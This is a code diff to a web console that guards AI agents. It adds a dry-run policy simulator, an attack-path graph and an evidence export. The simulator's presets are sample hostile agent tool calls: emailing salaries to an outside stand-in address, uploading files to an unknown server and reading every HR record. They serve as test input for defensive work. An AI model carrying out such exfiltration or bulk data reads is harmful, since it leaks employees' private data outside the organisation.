@@ -77,7 +77,7 @@ async function refreshStatus() {
 
 // ---------------------------------------------------------------- routing
 const VIEWS = {};
-const TITLES = { overview: "Security overview", demo: "Live scenarios", llm: "Live LLM agent (optional)", agents: "Agents & authority", approvals: "Approval center", investigate: "Threat & incident investigation",
+const TITLES = { overview: "Security overview", demo: "Live scenarios", simulate: "Policy what-if simulator", graph: "Attack-path graph", llm: "Live LLM agent (optional)", agents: "Agents & authority", approvals: "Approval center", investigate: "Threat & incident investigation",
   audit: "Audit explorer", recovery: "Owner recovery", results: "Evaluation results", diagnostics: "System diagnostics" };
 async function route() {
   const r = (location.hash.replace(/^#\//, "").split("?")[0]) || "overview";
@@ -177,6 +177,78 @@ function runHtml(r) {
       ${s.decisions ? `<div class="tbl"><table>${s.decisions.map(d => `<tr><td>${esc(d.tool)}</td><td>${pill(d.response, RESP[d.response])}</td><td class="mute">${esc(d.control)}</td><td class="faint">${esc(d.reason)}</td></tr>`).join("")}</table></div>` : ""}
       <details><summary>raw</summary><pre>${esc(JSON.stringify(s, null, 1))}</pre></details></div>`).join("")}</div>`;
 }
+
+// ---------------------------------------------------------------- 2c. policy what-if simulator (dry run, nothing executes)
+const TOOLS = ["search_suppliers", "get_prices", "read_supplier_doc", "create_purchase_request", "send_email", "read_hr_record", "update_hr_record",
+  "read_inbox", "web_search", "read_doc", "write_summary", "upload_file", "read_logs", "query_metrics", "restart_service", "deploy_release"];
+const PRESETS = [
+  ["Exfiltrate salaries to an outside address", { tool: "send_email", args: { to: "audit@collect.example", body: "salaries" }, destination: "collect.example" }],
+  ["Read every HR record", { tool: "read_hr_record", args: { employee: "all" } }],
+  ["Purchase with an amount not in the task", { tool: "create_purchase_request", args: { supplier: "umbrella", amount: 9000 } }],
+  ["Upload a file to an unknown server", { tool: "upload_file", args: { url: "https://drop.example/x" }, destination: "drop.example" }],
+  ["Normal in-role price check", { tool: "get_prices", args: { item: "valves" } }]];
+VIEWS.simulate = async el => {
+  clearInterval(S.timer); el.innerHTML = loading();
+  let ags; try { ags = await api("/api/agents"); } catch (e) { el.innerHTML = errBox(e, "Loading agents"); return; }
+  if (!ags.length) { el.innerHTML = empty("No agents. Reset the demo first."); return; }
+  el.innerHTML = `<p class="lead">Ask the live engine <b>"what would you decide?"</b> for any tool call. The decision is computed on a <b>throwaway copy</b> of the current state: it is not sent to the PEP or the tool server, not written to the audit, and creates no approval or quarantine. Use it to try your own attack ideas.</p>
+    <div class="grid g2"><div class="card"><h3>Proposed tool call</h3>
+      <div class="row" style="margin-bottom:10px">${PRESETS.map((p, i) => `<button class="sm preset" data-p="${i}">${esc(p[0])}</button>`).join("")}</div>
+      <form id="sf" class="form" novalidate>
+        <label class="f">Agent<select name="agent">${ags.map(a => `<option value="${esc(a.agent_id)}">${esc(a.agent_id)} (${esc(a.role)} / ${esc(a.status)})</option>`).join("")}</select></label>
+        <label class="f">Tool<select name="tool">${TOOLS.map(t => `<option>${t}</option>`).join("")}</select></label>
+        <label class="f" style="grid-column:1/-1">Arguments (JSON)<textarea name="args">{"item": "valves"}</textarea></label>
+        <label class="f">Destination<input name="dest" value="internal"></label>
+        <div><button class="primary">Simulate decision</button></div></form><p class="err" id="sferr"></p></div>
+      <div class="card" id="sout">${empty("The engine's verdict appears here.")}</div></div>`;
+  const f = $("#sf");
+  el.querySelectorAll("[data-p]").forEach(b => b.onclick = () => { const p = PRESETS[+b.dataset.p][1]; f.tool.value = p.tool; f.args.value = JSON.stringify(p.args); f.dest.value = p.destination || "internal"; });
+  f.onsubmit = async ev => {
+    ev.preventDefault(); $("#sferr").textContent = "";
+    let args; try { args = JSON.parse(f.args.value || "{}"); if (typeof args !== "object" || Array.isArray(args)) throw 0; } catch (e) { $("#sferr").textContent = "Arguments must be a JSON object."; return; }
+    $("#sout").innerHTML = loading("Asking the engine (dry run)…");
+    try {
+      const r = await api("/api/simulate", { agent_id: f.agent.value, tool: f.tool.value, args, destination: f.dest.value });
+      const d = r.decision;
+      $("#sout").innerHTML = `<div class="row"><h3 style="margin:0">Would be: </h3>${pill(d.response, RESP[d.response])}${d.agent_status_change ? pill(`agent would be ${d.agent_status_change}`, STATUS[d.agent_status_change]) : ""}<span class="spacer"></span>${pill("SIMULATION: nothing executed", "info")}</div>
+        <dl class="kv" style="margin-top:10px"><dt>Reason</dt><dd>${esc(d.reason)}</dd><dt>Stopping control</dt><dd>${esc(d.control)}</dd>
+          <dt>Risk score</dt><dd>${esc(d.risk_score)} (${esc(d.risk_band)}) <span class="faint">ordinal, not a probability</span></dd><dt>Cedar policy P</dt><dd>${esc(d.cedar ?? "n/a")}</dd>
+          <dt>Live state unchanged</dt><dd>${r.live_state_unchanged ? pill("verified", "ok") : pill("NO", "bad")}</dd></dl>
+        <h3 style="margin-top:12px">Factors and evidence</h3>${factorsHtml(d.factors)}<p class="faint">${esc(r.note)}</p>`;
+    } catch (e) { $("#sout").innerHTML = errBox(e, "Simulation"); }
+  };
+};
+
+// ---------------------------------------------------------------- 2d. attack-path graph (from real decisions)
+VIEWS.graph = async el => {
+  clearInterval(S.timer); el.innerHTML = loading();
+  let ev, ags, dl;
+  try { [ev, ags, dl] = await Promise.all([api("/api/events?limit=5000"), api("/api/agents"), api("/api/delegations")]); } catch (e) { el.innerHTML = errBox(e, "Loading decisions"); return; }
+  if (!ev.length) { el.innerHTML = empty("No decisions yet. Run a few live scenarios first."); return; }
+  const agents = [...new Set(ev.map(e => e.agent_id))], tools = [...new Set(ev.map(e => e.tool))].sort(), dests = [...new Set(ev.map(e => e.destination || "internal"))].sort();
+  const W = 1100, rowH = 34, H = Math.max(agents.length, tools.length, dests.length) * rowH + 80, X = [40, 470, 900], bw = 170;
+  const y = (list, v) => 60 + list.indexOf(v) * rowH + (H - 80 - list.length * rowH) / 2;
+  const agg = {}; const add = (k, e) => { const a = agg[k] || (agg[k] = { ALLOW: 0, APPROVAL_REQUIRED: 0, DENY: 0, ids: [] }); a[e.response] = (a[e.response] || 0) + 1; a.ids.push(e.decision_id); };
+  ev.forEach(e => { add(`a|${e.agent_id}|${e.tool}`, e); add(`t|${e.tool}|${e.destination || "internal"}`, e); });
+  const col = a => a.DENY ? "var(--edge-bad)" : a.APPROVAL_REQUIRED ? "var(--edge-warn)" : "var(--edge-ok)";
+  const curve = (x1, y1, x2, y2) => `M${x1},${y1} C${(x1 + x2) / 2},${y1} ${(x1 + x2) / 2},${y2} ${x2},${y2}`;
+  const st = Object.fromEntries(ags.map(a => [a.agent_id, a.status]));
+  const edges = Object.entries(agg).map(([k, a]) => { const [kind, from, to] = k.split("|");
+    const [x1, y1, x2, y2] = kind === "a" ? [X[0] + bw, y(agents, from) + 12, X[1], y(tools, to) + 12] : [X[1] + bw, y(tools, from) + 12, X[2], y(dests, to) + 12];
+    const n = a.ALLOW + a.APPROVAL_REQUIRED + a.DENY;
+    return `<path d="${curve(x1, y1, x2, y2)}" stroke="${col(a)}" stroke-width="${Math.min(2 + n, 9)}" opacity=".75" data-agent="${kind === "a" ? esc(from) : ""}" data-tool="${esc(kind === "a" ? to : from)}"><title>${esc(from)} → ${esc(to)}: ${a.ALLOW} allowed, ${a.APPROVAL_REQUIRED} held, ${a.DENY} denied</title></path>`; }).join("");
+  const dlg = (dl || []).map(d => { const a = y(agents, d.parent), b = y(agents, d.child); if (a === undefined || b === undefined || !agents.includes(d.parent) || !agents.includes(d.child)) return "";
+    return `<path d="M${X[0]},${a + 12} C${X[0] - 30},${a + 12} ${X[0] - 30},${b + 12} ${X[0]},${b + 12}" stroke="var(--accent)" stroke-dasharray="4 3" stroke-width="2"><title>delegation ${esc(d.id)} (${esc(d.status)}): ${esc(d.scopes.join(", "))}</title></path>`; }).join("");
+  const node = (x, yy, label, cls = "") => `<g class="node ${cls}"><rect x="${x}" y="${yy}" width="${bw}" height="24" rx="6"/><text x="${x + 10}" y="${yy + 16}">${esc(label)}</text></g>`;
+  el.innerHTML = `<p class="lead">Every line is real control-plane decisions: <b>agent → tool → destination</b>, with thickness for the number of calls and colour for the worst outcome (<span style="color:var(--edge-ok)">allowed</span>, <span style="color:var(--edge-warn)">held for approval</span>, <span style="color:var(--edge-bad)">denied</span>). Dashed arcs are delegations; a red-outlined agent is quarantined. Click a line to investigate those decisions.</p>
+    <div class="card"><svg class="graph" viewBox="0 0 ${W + 120} ${H}" role="img" aria-label="attack-path graph">
+      <text class="col" x="${X[0]}" y="30">Agents</text><text class="col" x="${X[1]}" y="30">Tools</text><text class="col" x="${X[2]}" y="30">Destinations</text>
+      ${edges}${dlg}
+      ${agents.map(a => node(X[0], y(agents, a), `${a}${st[a] && st[a] !== "active" ? " · " + st[a] : ""}`, `agent ${st[a] === "quarantined" ? "q" : ""}`)).join("")}
+      ${tools.map(t => node(X[1], y(tools, t), t)).join("")}${dests.map(d => node(X[2], y(dests, d), d)).join("")}
+    </svg></div><p class="faint">${ev.length} decisions. Outbound effects in the demo are simulated by the mock tool server.</p>`;
+  el.querySelectorAll("path[data-tool]").forEach(p => p.onclick = () => { location.hash = `#/investigate?agent=${encodeURIComponent(p.dataset.agent)}&resp=`; });
+};
 
 // ---------------------------------------------------------------- 2b. optional live LLM agent
 VIEWS.llm = async el => {
@@ -328,9 +400,20 @@ VIEWS.investigate = async el => {
           <dt>Detection alert</dt><dd>${sel.alert_id ? `${pill(sel.alert_id, "info")} ${alert_ && alert_.actionable === false ? `<span class="faint">informational, aggregated ${alert_.aggregated_count || 1}×</span>` : ""}` : sel.aggregated_into ? `<span class="faint">folded into ${esc(sel.aggregated_into)}</span>` : `<span class="faint">none</span>`}</dd></dl>
         <h3 style="margin-top:12px">Contributing factors and evidence</h3>${factorsHtml(sel.factors)}
         <h3 style="margin-top:12px">Expected authority</h3><pre>${esc(JSON.stringify(sel.expected_authority, null, 1))}</pre>
+        <div class="row" style="margin-top:12px"><button id="xp" class="primary">Export verifiable evidence pack</button><span id="xpout" class="faint"></span></div>
         <p class="faint">A detection alert is not an outcome. Prevention is the decision itself (DENY or APPROVAL_REQUIRED); live scenarios additionally verify that the tool server recorded no effect.</p></div>` : ""}
     </div>`;
   const go = (k, v) => { const p = new URLSearchParams({ agent: f.agent, resp: f.resp, d: f.d, [k]: v }); location.hash = `#/investigate?${p}`; };
+  if ($("#xp")) $("#xp").onclick = async () => {
+    $("#xpout").textContent = "exporting…";
+    try {
+      const p = await http(`/console/evidence/${encodeURIComponent(sel.decision_id)}`);
+      const checks = p._self_check || []; const good = checks.every(c => c.ok);
+      const blob = new Blob([JSON.stringify(Object.fromEntries(Object.entries(p).filter(([k]) => !k.startsWith("_"))), null, 1)], { type: "application/json" });
+      $("#xpout").innerHTML = `${pill(good ? "self-check VERIFIED" : "self-check FAILED", good ? "ok" : "bad")} ${checks.length} checks · ${p.audit.records.length} chained audit records · ${p.tool_server_effects.length} tool-server effect(s) ·
+        <a download="${esc(sel.decision_id)}.json" href="${URL.createObjectURL(blob)}">download</a> · verify offline: <span class="mono">python console/verify_evidence_pack.py ${esc(sel.decision_id)}.json</span>`;
+    } catch (e) { $("#xpout").textContent = `export failed: ${e.message}`; }
+  };
   if ($("#fa")) { $("#fa").onchange = e => go("agent", e.target.value); $("#fr").onchange = e => go("resp", e.target.value); }
   el.querySelectorAll("[data-d]").forEach(r => r.onclick = () => go("d", r.dataset.d));
 };
